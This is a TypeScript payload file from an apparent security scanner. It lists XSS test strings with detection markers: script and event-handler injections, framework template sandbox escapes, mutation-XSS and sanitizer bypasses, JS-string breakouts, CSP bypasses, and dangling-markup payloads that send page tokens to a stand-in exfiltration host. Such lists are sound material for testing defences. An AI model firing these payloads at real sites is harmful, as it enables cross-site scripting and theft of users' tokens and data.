/** XSS test payloads — non-destructive detection only */

export interface XSSPayload {
  payload: string;
  marker: string;
  type: 'reflected' | 'dom' | 'event-handler' | 'template';
}

export const XSS_PAYLOADS: XSSPayload[] = [
  // ── Reflected: Basic script injection ─────────────────────────────
  { payload: '<script>alert("secbot-xss-0")</script>', marker: 'secbot-xss-0', type: 'reflected' },
  { payload: '"><script>alert("secbot-xss-1")</script>', marker: 'secbot-xss-1', type: 'reflected' },
  { payload: "'><script>alert('secbot-xss-2')</script>", marker: 'secbot-xss-2', type: 'reflected' },
  { payload: '</script><script>alert("secbot-xss-3")</script>', marker: 'secbot-xss-3', type: 'reflected' },
  { payload: '<script>var x="secbot-xss-4";alert(x)</script>', marker: 'secbot-xss-4', type: 'reflected' },
  { payload: '<ScRiPt>alert("secbot-xss-5")</ScRiPt>', marker: 'secbot-xss-5', type: 'reflected' },
  { payload: '<script/src="data:,alert(\'secbot-xss-6\')"></script>', marker: 'secbot-xss-6', type: 'reflected' },
  { payload: '<script>alert`secbot-xss-7`</script>', marker: 'secbot-xss-7', type: 'reflected' },

  // ── Event handlers ────────────────────────────────────────────────
  { payload: '" onmouseover="alert(\'secbot-xss-8\')"', marker: 'secbot-xss-8', type: 'event-handler' },
  { payload: "' onmouseover='alert(\"secbot-xss-9\")'", marker: 'secbot-xss-9', type: 'event-handler' },
  { payload: '" onfocus="alert(\'secbot-xss-10\')" autofocus="', marker: 'secbot-xss-10', type: 'event-handler' },
  { payload: "' onfocus='alert(\"secbot-xss-11\")' autofocus='", marker: 'secbot-xss-11', type: 'event-handler' },
  { payload: '" onerror="alert(\'secbot-xss-12\')" "', marker: 'secbot-xss-12', type: 'event-handler' },
  { payload: "' onerror='alert(\"secbot-xss-13\")' '", marker: 'secbot-xss-13', type: 'event-handler' },
  { payload: '" onload="alert(\'secbot-xss-14\')"', marker: 'secbot-xss-14', type: 'event-handler' },
  { payload: '" onclick="alert(\'secbot-xss-15\')"', marker: 'secbot-xss-15', type: 'event-handler' },

  // ── IMG/SVG/Body tag injection ────────────────────────────────────
  { payload: '<img src=x onerror="alert(\'secbot-xss-16\')">', marker: 'secbot-xss-16', type: 'event-handler' },
  { payload: '"><img src=x onerror="alert(\'secbot-xss-17\')">', marker: 'secbot-xss-17', type: 'event-handler' },
  { payload: '<svg onload="alert(\'secbot-xss-18\')">', marker: 'secbot-xss-18', type: 'event-handler' },
  { payload: '<svg/onload=alert("secbot-xss-19")>', marker: 'secbot-xss-19', type: 'event-handler' },
  { payload: '<body onload="alert(\'secbot-xss-20\')">', marker: 'secbot-xss-20', type: 'event-handler' },
  { payload: '<details open ontoggle="alert(\'secbot-xss-21\')">', marker: 'secbot-xss-21', type: 'event-handler' },
  { payload: '<video src=x onerror="alert(\'secbot-xss-22\')">', marker: 'secbot-xss-22', type: 'event-handler' },
  { payload: '<audio src=x onerror="alert(\'secbot-xss-23\')">', marker: 'secbot-xss-23', type: 'event-handler' },
  { payload: '<input onfocus="alert(\'secbot-xss-24\')" autofocus>', marker: 'secbot-xss-24', type: 'event-handler' },
  { payload: '<marquee onstart="alert(\'secbot-xss-25\')">', marker: 'secbot-xss-25', type: 'event-handler' },
  { payload: '<iframe src="javascript:alert(\'secbot-xss-26\')">', marker: 'secbot-xss-26', type: 'event-handler' },

  // ── SVG animation vectors (bypass tag name filters) ──────────────
  { payload: '<svg><animate onbegin="alert(\'secbot-xss-48\')" attributeName="x" dur="1s">', marker: 'secbot-xss-48', type: 'event-handler' },
  { payload: '<svg><set attributeName="onmouseover" to="alert(\'secbot-xss-49\')">', marker: 'secbot-xss-49', type: 'event-handler' },
  { payload: '<svg><image href=x onerror="alert(\'secbot-xss-50\')">', marker: 'secbot-xss-50', type: 'event-handler' },

  // ── Template injection ────────────────────────────────────────────
  { payload: '{{constructor.constructor("alert(\'secbot-xss-27\')")()}}', marker: 'secbot-xss-27', type: 'template' },
  { payload: '${alert("secbot-xss-28")}', marker: 'secbot-xss-28', type: 'template' },
  { payload: '{{alert("secbot-xss-29")}}', marker: 'secbot-xss-29', type: 'template' },
  { payload: '<%= alert("secbot-xss-30") %>', marker: 'secbot-xss-30', type: 'template' },
  { payload: '#{alert("secbot-xss-31")}', marker: 'secbot-xss-31', type: 'template' },

  // ── Framework-specific template injection ───────────────────────
  // Angular sandbox escape (v1.x)
  { payload: '{{\'a]".constructor.prototype.charAt=[].join;$eval(\'x]alert(secbot-xss-42)//\');}}', marker: 'secbot-xss-42', type: 'template' },
  // Angular v1.6+ sandbox escape
  { payload: '{{$on.constructor("alert(\'secbot-xss-43\')")()}}', marker: 'secbot-xss-43', type: 'template' },
  // Vue v2 template injection (v-html context or server-side rendering)
  { payload: '{{_c.constructor("alert(\'secbot-xss-44\')")()}}', marker: 'secbot-xss-44', type: 'template' },
  // Vue v3 template injection
  { payload: '{{$el.constructor.constructor("alert(\'secbot-xss-45\')")()}}', marker: 'secbot-xss-45', type: 'template' },
  // Svelte {@html} context — raw HTML injection
  { payload: '<img src=x onerror="alert(\'secbot-xss-46\')">', marker: 'secbot-xss-46', type: 'template' },
  // Pug/Jade template injection
  { payload: '#{alert("secbot-xss-47")}', marker: 'secbot-xss-47', type: 'template' },

  // ── Encoding variants ─────────────────────────────────────────────
  { payload: '&lt;script&gt;alert("secbot-xss-32")&lt;/script&gt;', marker: 'secbot-xss-32', type: 'reflected' },
  { payload: '%3Cscript%3Ealert(%22secbot-xss-33%22)%3C%2Fscript%3E', marker: 'secbot-xss-33', type: 'reflected' },
  { payload: '\\x3cscript\\x3ealert("secbot-xss-34")\\x3c/script\\x3e', marker: 'secbot-xss-34', type: 'reflected' },
  { payload: 'javascript:alert("secbot-xss-35")', marker: 'secbot-xss-35', type: 'reflected' },
  { payload: 'data:text/html,<script>alert("secbot-xss-36")</script>', marker: 'secbot-xss-36', type: 'reflected' },

  // ── DOM-centric ───────────────────────────────────────────────────
  { payload: '#<img src=x onerror=alert("secbot-xss-37")>', marker: 'secbot-xss-37', type: 'dom' },
  { payload: '#"><script>alert("secbot-xss-38")</script>', marker: 'secbot-xss-38', type: 'dom' },
  { payload: '#javascript:alert("secbot-xss-39")', marker: 'secbot-xss-39', type: 'dom' },
  { payload: '#\'-alert("secbot-xss-40")-\'', marker: 'secbot-xss-40', type: 'dom' },
  { payload: '#<svg/onload=alert("secbot-xss-41")>', marker: 'secbot-xss-41', type: 'dom' },
];

/**
 * @deprecated Use XSS_PAYLOADS[].marker instead. Kept for backward compatibility.
 */
export const XSS_MARKERS = XSS_PAYLOADS.map(p => p.marker);

/** Mutation XSS payloads — exploit browser parser quirks to bypass sanitizers */
export const MUTATION_XSS_PAYLOADS: XSSPayload[] = [
  // noscript breakout
  { payload: '<noscript><img src=x onerror="alert(\'secbot-mxss-0\')"></noscript>', marker: 'secbot-mxss-0', type: 'dom' },
  // Math namespace confusion
  { payload: '<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert("secbot-mxss-1")>', marker: 'secbot-mxss-1', type: 'dom' },
  // SVG foreignObject
  { payload: '<svg><foreignObject><body onerror=alert("secbot-mxss-2")><img src=x></body></foreignObject></svg>', marker: 'secbot-mxss-2', type: 'dom' },
  // Style tag breakout in SVG
  { payload: '<svg><style>{font-family:\'<img/src=x onerror=alert("secbot-mxss-3")>\'}</style></svg>', marker: 'secbot-mxss-3', type: 'dom' },
  // DOMPurify bypass (namespace confusion)
  { payload: '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert("secbot-mxss-4")>', marker: 'secbot-mxss-4', type: 'dom' },
  // Form tag injection
  { payload: '<form><button formaction=javascript:alert("secbot-mxss-5")>click</button></form>', marker: 'secbot-mxss-5', type: 'dom' },
  // Details/summary auto-execute
  { payload: '<details open ontoggle=alert("secbot-mxss-6")><summary>x</summary></details>', marker: 'secbot-mxss-6', type: 'event-handler' },
  // Nested template with script
  { payload: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(\'secbot-mxss-7\') /></svg>#x" />', marker: 'secbot-mxss-7', type: 'dom' },
];

/**
 * JavaScript string context payloads — for when user input is reflected inside
 * <script> blocks as JS string literals (e.g., var q = "USER_INPUT").
 * These break out of the string context and inject executable JavaScript.
 */
export const JS_CONTEXT_PAYLOADS: XSSPayload[] = [
  // Close double-quoted JS string, execute, comment rest
  { payload: '";alert("secbot-xss-51");//', marker: 'secbot-xss-51', type: 'reflected' },
  // Close single-quoted JS string
  { payload: "';alert('secbot-xss-52');//", marker: 'secbot-xss-52', type: 'reflected' },
  // Close script tag entirely — universal escape from any JS context
  { payload: '</script><img src=x onerror="alert(\'secbot-xss-53\')">', marker: 'secbot-xss-53', type: 'reflected' },
  // Backslash escape bypass — when server adds one backslash: \" → \\" → " is free
  { payload: '\\";alert("secbot-xss-54");//', marker: 'secbot-xss-54', type: 'reflected' },
  // Line terminator injection (U+2028 breaks JS strings in pre-ES2019 engines)
  { payload: '\u2028alert("secbot-xss-55")//', marker: 'secbot-xss-55', type: 'reflected' },
  // JSON context: close JSON value, inject JS via concatenation
  { payload: '"+alert("secbot-xss-56")+"', marker: 'secbot-xss-56', type: 'reflected' },
  // Numeric assignment breakout — for var x = USER_INPUT; (no quotes)
  { payload: '1;alert("secbot-xss-57");//', marker: 'secbot-xss-57', type: 'reflected' },
];

/**
 * Dangling markup injection payloads — data exfiltration without JavaScript.
 * These open an unclosed tag that captures subsequent HTML content
 * (tokens, CSRF nonces, user data) and sends it to an attacker URL.
 * Works even under strict CSP because no script execution is needed.
 */
export const DANGLING_MARKUP_PAYLOADS: XSSPayload[] = [
  // Unclosed img src — captures HTML until next matching quote
  { payload: '"><img src="//secbot-dm.test/exfil?d=', marker: 'secbot-dm-0', type: 'reflected' },
  // Unclosed form action — captures form tokens on submit
  { payload: '"><form action="//secbot-dm.test/exfil"><input type=submit>', marker: 'secbot-dm-1', type: 'reflected' },
  // Base tag hijack — redirects all relative URLs to attacker
  { payload: '"><base href="//secbot-dm.test/">', marker: 'secbot-dm-2', type: 'reflected' },
  // Textarea capture — everything after this goes into a visible textarea
  { payload: '"><textarea>', marker: 'secbot-dm-3', type: 'reflected' },
  // Meta refresh — exfiltrates page content via redirect URL
  { payload: '"><meta http-equiv="refresh" content="0;url=//secbot-dm.test/exfil?d=', marker: 'secbot-dm-4', type: 'reflected' },
];

/** CSP bypass payloads — exploit weak CSP configurations */
export const CSP_BYPASS_PAYLOADS: XSSPayload[] = [
  { payload: '<base href="https://secbot-csp-test.example.com/">', marker: 'secbot-csp-0', type: 'dom' },
  { payload: '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(\'secbot-csp-1\')"></script>', marker: 'secbot-csp-1', type: 'reflected' },
  { payload: '<img src=x onerror="eval(atob(\'YWxlcnQoInNlY2JvdC1jc3AtMiIp\'))">', marker: 'secbot-csp-2', type: 'event-handler' },
  { payload: '<script src="data:text/javascript,alert(\'secbot-csp-3\')"></script>', marker: 'secbot-csp-3', type: 'reflected' },
  { payload: '<object data="data:text/html,<script>alert(\'secbot-csp-4\')</script>">', marker: 'secbot-csp-4', type: 'dom' },
  { payload: '{{constructor.constructor("alert(\'secbot-csp-5\')")()}}', marker: 'secbot-csp-5', type: 'template' },
];
